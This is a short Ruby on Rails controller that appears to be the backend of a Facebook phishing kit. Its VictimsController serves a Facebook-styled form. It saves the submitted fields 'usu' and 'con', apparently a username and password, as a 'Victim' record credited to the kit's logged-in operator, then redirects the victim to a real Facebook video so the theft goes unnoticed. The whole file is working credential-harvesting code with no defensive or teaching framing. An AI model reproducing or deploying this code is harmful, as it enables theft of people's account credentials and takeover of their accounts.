class VictimsController < ApplicationController
	layout 'facebook'
	before_action :authenticate_user!, except: [:new]
	def mobile_device?
	   if session[:mobile_param]
	     session[:mobile_param] == "1"
	   else
	     request.user_agent =~ /Mobile|webOS/
	   end
	end
	def new 
		@V= Victim.new
		if mobile_device?
  			
	  	else
	  		@g="jj"
	  	end
	end

	def create
		@V=Victim.create(usu: params[:victim][:usu],con: params[:victim][:con],swusu: current_user)
		redirect_to 'https://www.facebook.com/galatziaoficial/videos/992663864137637/?theater'
	end
end
